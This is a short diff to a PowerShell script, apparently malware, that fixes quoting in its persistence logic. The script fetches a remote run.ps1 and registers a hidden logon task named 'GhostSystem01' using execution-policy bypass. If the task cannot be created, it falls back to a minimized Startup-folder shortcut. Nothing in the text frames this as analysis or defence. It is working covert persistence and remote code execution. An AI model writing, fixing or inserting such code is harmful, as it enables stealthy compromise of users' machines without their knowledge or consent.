@@ -15,13 +15,14 @@ if(-not $poll){
 New-Item -ItemType Directory (Split-Path $me) -Force | Out-Null
 try{ iwr -useb "$base/run.ps1?t=$([int](Get-Date -UFormat %s))" -OutFile $me -UseB }catch{ Copy-Item $PSCommandPath $me -Force }
 
-schtasks /create /tn "GhostSystem01" /tr "powershell -w hidden -nop -ep bypass -f "$me" -poll" /sc onlogon /f 2>$null | Out-Null
+$args1='-w hidden -nop -ep bypass -f "' + $me + '" -poll'
+schtasks /create /tn "GhostSystem01" /tr ('powershell ' + $args1) /sc onlogon /f 2>$null | Out-Null
 if(-not (schtasks /query /tn "GhostSystem01" 2>$null)){
 $lnk="$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\GhostSystem01.lnk"
 $ws=New-Object -ComObject WScript.Shell
 $s=$ws.CreateShortcut($lnk)
 $s.TargetPath="powershell"
-$s.Arguments="-w hidden -nop -ep bypass -f "$me" -poll"
+$s.Arguments=$args1
 $s.WindowStyle=7
 $s.Save()
 }
